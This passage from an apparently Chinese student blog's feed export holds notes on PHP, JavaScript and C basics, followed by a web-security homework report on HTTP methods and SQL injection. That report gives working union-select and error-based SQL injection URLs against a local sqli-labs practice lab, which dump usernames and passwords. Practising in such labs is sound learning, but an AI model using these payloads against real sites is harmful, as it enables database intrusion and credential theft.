)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;&lt;pre&gt;&quot;</span>); <span class="comment">// 格式化输出数组</span></span><br><span class="line">print_r(<span class="variable">$sites</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h2><p>下面是排序方法，用到再查：</p>
<p>对于普通数组：</p>
<ul>
<li><p>sort(array) - 对数组进行升序排列</p>
</li>
<li><p>rsort(array) - 对数组进行降序排列</p>
</li>
</ul>
<p>对于关联数组：</p>
<ul>
<li>asort(array) - 根据关联数组的值，对数组进行升序排列</li>
<li>ksort(array) - 根据关联数组的键，对数组进行升序排列</li>
<li>arsort(array) - 根据关联数组的值，对数组进行降序排列</li>
<li>krsort(array) - 根据关联数组的键，对数组进行降序排列</li>
</ul>
<h2 id="超级全局变量"><a href="#超级全局变量" class="headerlink" title="超级全局变量"></a><strong>超级全局变量</strong></h2><ol>
<li><strong>$GLOBALS</strong></li>
</ol>
<p>这个东西其实是个数组，里面记录了所有被使用（声明）的全局变量，变量名字就是数组里的键，这个东西在PHP的任何地方都可以进行访问，在函数里面创建一个全局变量的方法中，除了使用global关键词以外，还可以直接将这个变量添加到 <strong>$GLOBALS</strong> 数组里面。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">2</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$a</span>,<span class="variable">$b</span>;</span><br><span class="line">    <span class="variable">$GLOBALS</span>[<span class="string">&#x27;c&#x27;</span>]=<span class="variable">$a</span>+<span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line">add();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li><strong>$_SERVER</strong></li>
</ol>
<p>这个超级全局变量数组里面包括头，路径，以及脚本位置等等信息数组，这是由web服务器创建的，很多关于服务器的信息都在里面可以访问。</p>
<p>下面是一个 <strong>$_SERVER</strong> 数组里面包含的内容。</p>
<table>
<thead>
<tr>
<th align="left">元素/代码</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$_SERVER[‘PHP_SELF’]</td>
<td align="left">当前执行脚本的文件名，与 document root 有关。例如，在地址为 <a href="http://example.com/test.php/foo.bar">http://example.com/test.php/foo.bar</a> 的脚本中使用 $<em>SERVER[‘PHP_SELF’] 将得到 /test.php/foo.bar。__FILE_</em> 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。</td>
</tr>
<tr>
<td align="left">$_SERVER[‘GATEWAY_INTERFACE’]</td>
<td align="left">服务器使用的 CGI 规范的版本；例如，”CGI/1.1”。</td>
</tr>
<tr>
<td align="left">$_SERVER[‘SERVER_ADDR’]</td>
<td align="left">当前运行脚本所在的服务器的 IP 地址。</td>
</tr>
<tr>
<td align="left">$_SERVER[‘SERVER_NAME’]</td>
<td align="left">当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。(如: <a href="http://www.runoob.com/">www.runoob.com</a>)</td>
</tr>
<tr>
<td align="left">$_SERVER[‘SERVER_SOFTWARE’]</td>
<td align="left">服务器标识字符串，在响应请求时的头信息中给出。 (如：Apache/2.2.24)</td>
</tr>
<tr>
<td align="left">$_SERVER[‘SERVER_PROTOCOL’]</td>
<td align="left">请求页面时通信协议的名称和版本。例如，”HTTP/1.0”。</td>
</tr>
<tr>
<td align="left">$_SERVER[‘REQUEST_METHOD’]</td>
<td align="left">访问页面使用的请求方法；例如，”GET”, “HEAD”，”POST”，”PUT”。</td>
</tr>
<tr>
<td align="left">$_SERVER[‘REQUEST_TIME’]</td>
<td align="left">请求开始时的时间戳。从 PHP 5.1.0 起可用。 (如：1377687496)</td>
</tr>
<tr>
<td align="left">$_SERVER[‘QUERY_STRING’]</td>
<td align="left">query string（查询字符串），如果有的话，通过它进行页面访问。</td>
</tr>
<tr>
<td align="left">$_SERVER[‘HTTP_ACCEPT’]</td>
<td align="left">当前请求头中 Accept: 项的内容，如果存在的话。</td>
</tr>
<tr>
<td align="left">$_SERVER[‘HTTP_ACCEPT_CHARSET’]</td>
<td align="left">当前请求头中 Accept-Charset: 项的内容，如果存在的话。例如：”iso-8859-1,*,utf-8”。</td>
</tr>
<tr>
<td align="left">$_SERVER[‘HTTP_HOST’]</td>
<td align="left">当前请求头中 Host: 项的内容，如果存在的话。</td>
</tr>
<tr>
<td align="left">$_SERVER[‘HTTP_REFERER’]</td>
<td align="left">引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。)</td>
</tr>
<tr>
<td align="left">$_SERVER[‘HTTPS’]</td>
<td align="left">如果脚本是通过 HTTPS 协议被访问，则被设为一个非空的值。</td>
</tr>
<tr>
<td align="left">$_SERVER[‘REMOTE_ADDR’]</td>
<td align="left">浏览当前页面的用户的 IP 地址。</td>
</tr>
<tr>
<td align="left">$_SERVER[‘REMOTE_HOST’]</td>
<td align="left">浏览当前页面的用户的主机名。DNS 反向解析不依赖于用户的 REMOTE_ADDR。</td>
</tr>
<tr>
<td align="left">$_SERVER[‘REMOTE_PORT’]</td>
<td align="left">用户机器上连接到 Web 服务器所使用的端口号。</td>
</tr>
<tr>
<td align="left">$_SERVER[‘SCRIPT_FILENAME’]</td>
<td align="left">当前执行脚本的绝对路径。</td>
</tr>
<tr>
<td align="left">$_SERVER[‘SERVER_ADMIN’]</td>
<td align="left">该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。(如：<a href="mailto:&#x73;&#x6f;&#109;&#101;&#x6f;&#110;&#x65;&#x40;&#x72;&#x75;&#x6e;&#x6f;&#111;&#x62;&#46;&#99;&#111;&#109;">&#x73;&#x6f;&#109;&#101;&#x6f;&#110;&#x65;&#x40;&#x72;&#x75;&#x6e;&#x6f;&#111;&#x62;&#46;&#99;&#111;&#109;</a>)</td>
</tr>
<tr>
<td align="left">$_SERVER[‘SERVER_PORT’]</td>
<td align="left">Web 服务器使用的端口。默认值为 “80”。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。</td>
</tr>
<tr>
<td align="left">$_SERVER[‘SERVER_SIGNATURE’]</td>
<td align="left">包含了服务器版本和虚拟主机名的字符串。</td>
</tr>
<tr>
<td align="left">$_SERVER[‘PATH_TRANSLATED’]</td>
<td align="left">当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。</td>
</tr>
<tr>
<td align="left">$_SERVER[‘SCRIPT_NAME’]</td>
<td align="left">包含当前脚本的路径。这在页面需要指向自己时非常有用。<strong>FILE</strong> 常量包含当前脚本(例如包含文件)的完整路径和文件名。</td>
</tr>
<tr>
<td align="left">$_SERVER[‘SCRIPT_URI’]</td>
<td align="left">URI 用来指定要访问的页面。例如 “/index.html”。</td>
</tr>
</tbody></table>
<ol start="3">
<li><strong>$_REQUEST</strong></li>
</ol>
<p>这个数组用来收集HTML表单调教的数据，比如和Post传过来的信息什么的。</p>
<ol start="4">
<li><strong>$_POST</strong></li>
</ol>
<p>这个数组用来收集HTML表单调教的数据，比如和Post传过来的信息什么的。</p>
<ol start="5">
<li><strong>$_GET</strong></li>
</ol>
<p>这个数组用来收集HTML表单调教的数据，比如和Get传过来的信息什么的。</p>
<h2 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h2><p>魔术常量使用前后两个下划线包裹比如：<code>__LINE__</code> 就保存着它在第几行，你把它写在第几行，它的值就是几。</p>
<p>其他的就不一一介绍了。</p>
<h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><p>和C++是一样的，使用Class 关键字来进行声明一个 类 其中这里面有一个自身变量，可以在函数里面代替外部声明的类名称使用，就是 <code>$this</code> 。</p>
<p>如果不想声明变量就使用的话，是没有问题的，变量将被默认创建为 <code>public</code> 类型的变量，但是如果要声明变量或者给变量赋初始值的时候，就必须为其标记 <code>public</code> / <code>private</code> 或者 <code>protected</code> 来表明变量的访问权限。</p>
<p>类中的方法不可以声明属性，但是可以声明变量，其仅能在方法中使用。</p>
<p>其次如果要使用Class里面的变量或者函数的话，C++里面是使用 <code>.</code> 来进行引用的，而php是使用 <code>-&gt;</code> 来进行引用，eg：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OIer</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$NOIP_score</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Live</span>=<span class="literal">True</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">NOIP</span>(<span class="params"><span class="variable">$score</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;NOIP_score=<span class="variable">$score</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$score</span>&lt;<span class="number">200</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$Live</span>=<span class="literal">False</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Xorex</span>=<span class="keyword">new</span> OIer;</span><br><span class="line"><span class="variable">$Xorex</span>-&gt;NOIP(<span class="number">400</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Xorex</span>-&gt;NOIP_score;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>构造函数</strong></li>
</ul>
<p>类中支持一个构造函数，那就是 <code>__construct()</code> ，可以给类中的变量赋初值，是在创建一个变量的时候就可以使用的。</p>
<p>我们在new 一个对象的时候，可以同时使用 <code>__construct()</code> 直接在类的名字后面把初始化参数传进去。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OIer</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$NOIP_score</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Live</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$var1</span>,<span class="variable">$var2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$NOIP_score</span>=<span class="variable">$var1</span>;</span><br><span class="line">        <span class="variable">$Live</span>=<span class="variable">$var2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">NOIP</span>(<span class="params"><span class="variable">$score</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;NOIP_score=<span class="variable">$score</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$score</span>&lt;<span class="number">200</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Live=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Xorex</span>=<span class="keyword">new</span> OIer(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$Xorex</span>-&gt;NOIP(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Xorex</span>-&gt;Live;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Xorex</span>-&gt;NOIP_score;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>继承</strong></li>
</ul>
<p>php也有继承模式，继承就是这个这个类获得另外一个类的所有属性的方法。</p>
<p>当我们访问一个对象的属性或者方法的时候，首先会先从这个类的本身去寻找，如果找不到的话，发现有一个继承关系，然后就会从父类里寻找属性或者方法。所谓重写方法，其实就是在子类中找到了这个方法之后，就停止检索父类了，所以看起来就是重写了方法。</p>
<p>当我们对一个继承了其他类的对象进行序列化的时候，会同时序列化子类和父类的所有属性，并列在一起，无法区分。当然如果父子类里面又名称相同属性的时候，就会有 “重写” 的效果。</p>
<ul>
<li><strong>类中的静态属性</strong></li>
</ul>
<p>使用 <code>static</code> 关键字，处于权限声明和属性名称之间，作用和前面的静态变量是相同的。不同的是在这个属性可以在不同的类中共同使用，就和</p>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript学习笔记</title>
    <url>/2020/11/16/51638a233821/</url>
    <content><![CDATA[<h1 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h1><ol>
<li><strong>alert()</strong>  </li>
</ol>
<p>弹框信息，内部可以执行语句。</p>
<ol start="2">
<li><strong>document.write()</strong>  </li>
</ol>
<p>将内容写到 HTML 文档里面。里面可以执行语句，也可以直接输出字符串，符合 HTML 规范可以解析语句。</p>
<ol start="3">
<li><strong>innerHTML</strong></li>
</ol>
<p>用来写入到HTML语句里面，可以先使用 document.getElementById(<em>id</em>)  来获得对应 ID 的 HTML 元素，然后使用 innerHTML 来获取这个元素的内容。也就是说，复合语句：  <code>document.getElementById(id).innerHTML</code> 本身就相当与一个元素，可以输出它，也可以修改这个元素的值。</p>
<ol start="4">
<li><strong>console.log()</strong></li>
</ol>
<p>将里面的内容输出到浏览器的控制台中。</p>
<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><ol>
<li><p>使用 <code>var</code> 来定义一个变量。</p>
</li>
<li><p>使用  <code>//</code> 来进行单行注释，使用 <code>/**/</code> 进行多行注释。</p>
</li>
<li><p>使用关键词 <code>function</code> 来定义一个函数。</p>
</li>
<li><p>单引号和双引号互通，都可以对字符串使用。</p>
</li>
<li><p>和 PHP 一样有强相等和弱相等。</p>
</li>
</ol>
<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><ol>
<li>一共有：<code>String Number Boolean Array Object</code>  五种数据类型。</li>
<li>在声明一个变量的时候，可以指定数据类型：var Xorex=new Array;</li>
<li>Number 包括整形和浮点型，可以使用科学计数法。</li>
<li>Array 类型使用 [“Xorex”,1.3,true] 这样表示，下标从零开始。</li>
<li>对象类型拥有键值对，使用冒号表示。</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person=&#123;<span class="attr">firstname</span>:<span class="string">&quot;John&quot;</span>, <span class="attr">lastname</span>:<span class="string">&quot;Doe&quot;</span>, <span class="attr">id</span>:<span class="number">5566</span>&#125;;</span><br></pre></td></tr></table></figure>
<ol start="6">
<li><p>对象寻址可以使用 <code>person.firstname</code>  或者 <code>person[&quot;lastname&quot;]</code></p>
</li>
<li><p>对象内部可以加入方法：</p>
</li>
</ol>
<p>下面的代码中 fullname 是可以自定义的，作为这个方法的名字。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    firstName: <span class="string">&quot;John&quot;</span>,</span><br><span class="line">    lastName : <span class="string">&quot;Doe&quot;</span>,</span><br><span class="line">    id : <span class="number">5566</span>,</span><br><span class="line">    fullName : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.firstName + <span class="string">&quot; &quot;</span> + <span class="built_in">this</span>.lastName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ol start="8">
<li>字符串类型可以直接执行 + 拼接运算。</li>
<li>可以使用 typeof 操作符号 来返回变量的数据类型。</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(tpyeof <span class="string">&quot;Xorex&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>结果输出是 string</p>
<h1 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h1><table>
<thead>
<tr>
<th align="left">事件</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">onchange</td>
<td align="left">HTML 元素改变</td>
</tr>
<tr>
<td align="left">onclick</td>
<td align="left">用户点击 HTML 元素</td>
</tr>
<tr>
<td align="left">onmouseover</td>
<td align="left">用户在一个HTML元素上移动鼠标</td>
</tr>
<tr>
<td align="left">onmouseout</td>
<td align="left">用户从一个HTML元素上移开鼠标</td>
</tr>
<tr>
<td align="left">onkeydown</td>
<td align="left">用户按下键盘按键</td>
</tr>
<tr>
<td align="left">onload</td>
<td align="left">浏览器已完成页面的加载</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言题库</title>
    <url>/2020/10/09/3d277be41011/</url>
    <content><![CDATA[<blockquote>
<p>啊啊啊啊，即使写了两年的C++代码也免不了刷题的痛苦，而且还是语言题，但是这样也能学到不少知识呢。</p>
</blockquote>
<h2 id="一阶段"><a href="#一阶段" class="headerlink" title="一阶段"></a>一阶段</h2><ol>
<li><p>一个C语言源程序是由（<strong>函数组成</strong>）</p>
</li>
<li><p>C语言规定，在一个源程序中，main函数的位置（<strong>可以任意</strong>）</p>
</li>
<li><p>在C语言中，一个函数的函数体一般包括 （<strong>参数</strong>）和 （<strong>返回值</strong>）</p>
</li>
<li><p>上机运行C源程序过程：</p>
<p> <strong>编辑</strong>：输入源程序并存盘(.C)</p>
<p> <strong>编译</strong>：将源程序翻译为目标文件(.OBJ)</p>
<p> <strong>链接</strong>：将目标文件生成可执行文件( .EXE)</p>
<p> <strong>运行</strong>：执行.EXE文件,得到运行结果。</p>
</li>
<li><p>一个函数是由两部分组成的，它们分别是（<strong>函数头</strong>） 和（<strong>函数体</strong>）。</p>
</li>
<li><p><code>\</code> 是个转义字符，比如 <code>\x</code> 表示的是十六进制的数字，而 <code>\0</code> 表示的是一个八进制数字。  </p>
</li>
<li><p>十六位PC机中：<strong>char&lt;int&lt;long int&lt;=float&lt;double</strong></p>
</li>
<li><p><strong>实型</strong> 数据就是 <strong>浮点型</strong></p>
</li>
<li><p>不同类型数据经过表达式计算之后，最后的结果是 <strong>表达范围最大</strong> 的类型。</p>
</li>
<li><p>C语言中 <code>.1</code>  表示的是 <code>0.1</code> ，<code>1.</code>表示的是 <code>1.0</code></p>
</li>
<li><p>像 <code>printf</code> 和 <code>main</code> 这些 <strong>非关键字</strong> 可以作为变量名使用！</p>
</li>
<li><p>逗号表达式整体的值为 <strong>最后</strong> 一个表达式的值。</p>
</li>
<li><p>只要句子里面包含 <code>,</code> 那么这个语句就是逗号表达式，<strong>不属于</strong> 各种其他语句如 循环语句、赋值语句等等。</p>
</li>
<li><p>复合运算语句 如 ：<code>A+=B+C</code> 和<code>A*=C-D</code> 这些，<strong>先计算等号后面的</strong> 语句 <code>B+C</code> 和 <code>C-D</code> <strong>然后再进行</strong> 复合运算。</p>
</li>
</ol>
<h2 id="二阶段"><a href="#二阶段" class="headerlink" title="二阶段"></a>二阶段</h2><ol>
<li><p><code>if(10&lt;=x&lt;=20)</code> 是一个合法的语句，表示的意思是 <code>if((10&lt;=x)&lt;=20)</code> 先计算 <code>10&lt;+x</code> 的值的真假，比较 true 或者 false 是否 <code>&lt;=20</code> 最后返回比较的真假。</p>
</li>
<li><p><code>switch-case</code> 语句：</p>
</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(Value/Expression)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> Value1:</span><br><span class="line">        Expression1;</span><br><span class="line">        Expression2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> Value2:</span><br><span class="line">        Expression3;</span><br><span class="line">        Expression4;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        Expression5;</span><br><span class="line">        Expression6;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>注意这里Value只能是<strong>整形</strong>和<strong>字符型</strong> ，Value1/2 里面只能填写一个值，可以使用表达式（除了逗号表达式），default 可以不写。</li>
</ul>
<ol start="3">
<li><p>两个case里面的字符常量不可以相等。</p>
</li>
<li><p>逻辑运算符优先级<code>&amp;&amp;</code> 高于 <code>||</code>，所以 <code>||</code> 都是最后再运算的。</p>
</li>
<li><p>关系运算符 <code>&lt;</code> <code>&gt;</code> <code>&lt;=</code> <code>&gt;=</code> 的优先级比 <code>==</code> 和 <code>!=</code> 要高！</p>
</li>
</ol>
<h2 id="三阶段"><a href="#三阶段" class="headerlink" title="三阶段"></a>三阶段</h2><ol>
<li>do{xxx;}while(xxx); 记得 while 后面有分号</li>
</ol>
<h2 id="四阶段"><a href="#四阶段" class="headerlink" title="四阶段"></a>四阶段</h2><ol>
<li><p><code>a[2][4]=&#123;0&#125;</code> 会把数组里面的所有空间都初始化为 0</p>
</li>
<li><p>使用字符数组来输入字符串的时候：scanf(“%s%s”, a, b);  a 和 b 就已经是地址了，不需要 &amp; 运算。</p>
</li>
<li><p>字符串大小判断是 ASCII  一位一位去比较。That &lt; The</p>
</li>
</ol>
<h2 id="五阶段"><a href="#五阶段" class="headerlink" title="五阶段"></a>五阶段</h2><ol>
<li><p>凡是函数中未指定存储类别的局部变量都为 auto 自动。</p>
</li>
<li><p>在函数内的复合语句中定义的变量在本函数范围内有效 是错误的，只在复合语句中有效。比如这个变量是在while语句中定义的，那么只能在while语句括号里面调用，出了while就失效了。</p>
</li>
<li><p><code>func((exp1, exp2), (exp3, exp4, exp5));</code> 里面只有两个实参，就是exp2，和exp5 ，这是执行了两个逗号表达式。</p>
</li>
<li><p>main() 里面可以说明一个函数，但是不可以定义一个函数。</p>
</li>
<li><p>函数的定义不可以嵌套，但函数的调用可以嵌套。 （因为不能在一个函数里面定义另外一个函数啊，只能说明。）</p>
</li>
<li><p>当用二维数组作为形参时，第一维的大小可以省略，但第二维的大小不能。因为传进来的实参是一个数组的第一位地址，然后实参的所有元素依次填充到形参定义的数组里面，如果第二维省略，就无法填充（毕竟列可以无限嘛），但是如果列确定，就可以根据除法确定行数。</p>
</li>
<li><p>数组传参的同时，会退化成为指针，所以在操作的时候要小心越界。</p>
</li>
</ol>
<h2 id="六阶段"><a href="#六阶段" class="headerlink" title="六阶段"></a>六阶段</h2><ol>
<li><p>C语言中mian函数正确的声明应该是： main(int abc, char **abv)，参数后者等价与  *abv[] ，这个东西在使用命令行执行的时候会用到，<a href="https://my.oschina.net/u/231848/blog/277932">详细解释博客</a> 主要是来传入命令行输入的参数，abc为参数数量，abv是一个字符串指针数组，存储命令。</p>
</li>
<li><p>两个不同类型的指针相互赋值地址会警告。</p>
</li>
<li><p>如果要对指针进行自加自减运算，那么必须是一个数组指针，并且进行了自加自减运算之后不会越界。</p>
</li>
<li><p>函数名保存的也是一个地址，可以声明一个函数指针，然后把函数地址给它，它就可以当作函数来使用。<code>int(*Pointer)(int,int);</code> 其中第一个 int 表示的是函数返回值类型，后面的是参数的类型。调用的时候可以 <code>Pointer(x,y);</code> 或者  <code>(*Pointer)(x,y);</code></p>
</li>
<li><p>一个数组名，函数名，可以看作是一个常量指针，里面保存的是地址。</p>
</li>
<li><p><code>*p[3]</code> p是一个指针数组，<code>(*p)[3]</code> 中 p 是一个指向数组的指针。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Web小组报告（二）</title>
    <url>/2020/09/29/88da8982a4e7/</url>
    <content><![CDATA[<h2 id="URL-HTTP请求方法相关："><a href="#URL-HTTP请求方法相关：" class="headerlink" title="URL/HTTP请求方法相关："></a>URL/HTTP请求方法相关：</h2><ol>
<li><strong>请列举出4种常见URL协议：</strong></li>
</ol>
<ul>
<li>HTTP/HTTPS协议，FTP协议，File协议，Mailto协议等。</li>
</ul>
<ol start="2">
<li><strong>请列举出6种常见HTTP请求方法：</strong></li>
</ol>
<ul>
<li><p><strong>Get，Post，Head，Put，Delete，Options，TRACE，Connect</strong>，共七种请求方法。</p>
</li>
<li><p><strong>GET</strong>：用来请求访问已被URI识别的资源。</p>
</li>
<li><p><strong>POST</strong>：用来传输实体的主体。</p>
</li>
<li><p><strong>PUT</strong>：用来传输文件。</p>
</li>
<li><p><strong>HEAD</strong>：用来获取报文首部。</p>
</li>
<li><p><strong>DELETE</strong>：用来删除文件，和PUT相反。</p>
</li>
<li><p><strong>OPTIONS</strong>：询问针对请求URI指定的资源<br>支持的方法。</p>
</li>
<li><p><strong>TRACE</strong>： 让服务器返回之前的请求通<br>信。</p>
</li>
<li><p><strong>CONNECT</strong>：要求使用隧道协议链接代理。</p>
</li>
</ul>
<ol start="3">
<li><strong>向 <a href="http://example.com/">http://example.com</a> 发送GET请求,键值对为<code>name:xx</code>及<code>id:0</code>的URL是?</strong></li>
</ol>
<ul>
<li>URL：<a href="http://example.com/?name=xx&amp;id=0">http://example.com/?name=xx&amp;id=0</a></li>
</ul>
<ol start="4">
<li><strong>GET请求和POST请求的主要用途是?</strong></li>
</ol>
<ul>
<li>向目标地址发送获取资源的访问请求，GET可以传输简短的信息，POST可以传输较多信息。</li>
</ul>
<ol start="5">
<li><strong>假设存在以下场景:某人通过网上银行进行转账操作,你认为哪种请求方法更好?(GET/POST)</strong></li>
</ol>
<ul>
<li>当然是POST请求方法好，转账的时候输入信息不会显示在URL中，而是存在于Body中。</li>
</ul>
<h2 id="SQL注入相关："><a href="#SQL注入相关：" class="headerlink" title="SQL注入相关："></a>SQL注入相关：</h2><ol>
<li><strong>尝试描述:什么是sql注入?</strong></li>
</ol>
<ul>
<li>由于很多后台在进行对用户输入数据进行查询过程中，往往利用用户输入的数据来构造SQL语句，我们就可以利用输入的数据中加入自己的SQL语句，将其注入后台中并执行。以此达成获取数据库中的数据的目的。</li>
</ul>
<ol start="2">
<li><strong>尝试概括:sql注入的形成原因?</strong></li>
</ol>
<ul>
<li>开发人员使用动态字符串构造SQL语句来创建所需的命令，如果不对这些从用户获得的数据加以严格的过滤，构造的SQL语句可能存在来自于用户的恶意命令，对数据库安全造成严重威胁。</li>
</ul>
<ol start="3">
<li><strong>尽可能列举出所有的sql注入类型</strong></li>
</ol>
<ul>
<li><p>GET注入，Cookie注入，POST注入，HTTP头部注入</p>
</li>
<li><p>布尔注入，时间注入，报错注入，联合查询注入，堆查询注入，宽字节注入。</p>
</li>
</ul>
<ol start="4">
<li><strong>使用sqli-labs进行学习(请使用手工进行注入,不能使用相关工具,要求截图注入提交的URL及最后爆出flag标志(在当前数据库下的另外一个表中)):</strong></li>
</ol>
<ul>
<li><strong>Less-1</strong></li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=-1%27%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users%20--%20</span><br></pre></td></tr></table></figure>
<p><img src="https://xorex.space/image/128.png" alt="image.png"></p>
<ul>
<li><strong>Less-2</strong></li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-2/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20users%20--%20</span><br></pre></td></tr></table></figure>
<p><img src="https://xorex.space/image/129.png" alt="image.png"></p>
<ul>
<li><strong>Less-5</strong></li>
</ul>
<p>报错注入，我这里使用的构造group_concat重复写入错误。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-5/?id=-1%27%20union%20select%201,count(%2a),concat((select%20concat(username,%27%20%27,password)%20from%20users%20limit%200,1),floor(rand(0)%2a2))%20as%20a%20from%20information_schema.tables%20group%20by%20a%20--%20</span><br></pre></td></tr></table></figure>
<p><img src="https://xorex.space/image/130.png" alt="image.png"></p>
<p>剩下的数据只要修改LIMIT显示范围就可以得到了。</p>
<ul>
<li><strong>Less-8</strong></li>
</ul>
<p>这道题原本想要用burpsuite来解决的，但是浏览器代理出了点问题，burpsuite抓不到包，于是就只能现学Python花了很多时间，写了脚本解决问题，直接爆数据，成对输出：</p>
